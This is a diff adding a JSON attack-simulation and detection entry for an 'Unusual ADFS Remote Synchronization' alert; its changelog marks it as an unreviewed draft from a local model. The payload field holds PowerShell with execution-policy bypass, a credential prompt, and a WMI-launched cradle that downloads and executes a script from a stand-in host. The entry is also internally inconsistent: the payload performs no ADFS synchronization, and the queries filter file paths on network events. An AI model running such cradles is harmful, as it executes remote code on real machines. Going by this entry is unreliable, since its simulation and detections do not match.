@@ -1,0 +1,189 @@
+{
+  "id": "TTP-0000-0290",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-windows",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "windows"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Unusual ADFS Remote Synchronization from Non-ADFS Server",
+    "summary": "An attacker uses a non-ADFS server to initiate ADFS remote synchronization, which is typically only performed by ADFS servers. Cortex should detect this unusual network behavior and process execution.",
+    "description": "An attacker uses a non-ADFS server to initiate ADFS remote synchronization, which is typically only performed by ADFS servers. Cortex should detect this unusual network behavior and process execution."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1078",
+        "name": "Valid Accounts",
+        "tactic_ids": [
+          "TA0008",
+          "TA0005"
+        ],
+        "tactic_names": [
+          "Lateral Movement",
+          "Defense Evasion"
+        ]
+      },
+      {
+        "technique_id": "T1566",
+        "name": "Phishing",
+        "tactic_ids": [
+          "TA0001"
+        ],
+        "tactic_names": [
+          "Initial Access"
+        ]
+      },
+      {
+        "technique_id": "T1046",
+        "name": "Network Service Discovery",
+        "tactic_ids": [
+          "TA0007"
+        ],
+        "tactic_names": [
+          "Discovery"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "administrator",
+    "payload": {
+      "interpreter": "powershell",
+      "code": "powershell -exec bypass -Command \"[System.Net.Dns]::GetHostEntry('192.0.2.10')\"\nnet use Z: \\\\192.0.2.10\\share\n$cred = Get-Credential\nInvoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command \\\"IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.50:8080/payload.ps1')\\\"\"\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "network-connection",
+        "description": "Outbound connection to ADFS server IP",
+        "expected_value": "action_remote_ip = '192.0.2.10'"
+      },
+      {
+        "artifact_type": "process",
+        "description": "PowerShell process initiated from non-ADFS host",
+        "expected_value": "action_process_image_name = 'powershell.exe'"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Unusual ADFS Sync Process",
+        "description": "Detection of PowerShell process starting from non-ADFS server attempting ADFS sync",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = 'powershell.exe'\n| filter causality_actor_process_image_name != 'lsass.exe'\n| filter action_file_path contains 'adfs'",
+        "mitre_technique_ids": [
+          "T1078",
+          "T1566"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "ADFS Remote Sync from Non-ADFS Host",
+        "description": "Behavioral deviation when a non-ADFS server initiates ADFS synchronization",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.NETWORK_CONNECTION\n| filter action_remote_ip = '192.0.2.10'\n| filter causality_actor_process_image_name != 'lsass.exe'\n| filter action_file_path contains 'adfs'",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "non-adfs host initiating adfs sync",
+        "mitre_technique_ids": [
+          "T1078",
+          "T1566",
+          "T1046"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Unusual ADFS Sync Network Activity",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.NETWORK_CONNECTION\n| filter action_remote_ip = '192.0.2.10'\n| filter causality_actor_process_image_name != 'lsass.exe'\n| filter action_file_path contains 'adfs'\n| comp count by agent_hostname, action_remote_ip",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — Unusual ADFS Remote Synchronization network connections from non-ADFS server; Required Data: XDR Agent. Ref: https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/unusual-adfs-remote-synchronization-network-connections-from-non-adfs-server"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: Unusual ADFS Remote Synchronization network connections from non-ADFS server",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/unusual-adfs-remote-synchronization-network-connections-from-non-adfs-server",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1078",
+      "url": "https://attack.mitre.org/techniques/T1078/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1566",
+      "url": "https://attack.mitre.org/techniques/T1566/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1046",
+      "url": "https://attack.mitre.org/techniques/T1046/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
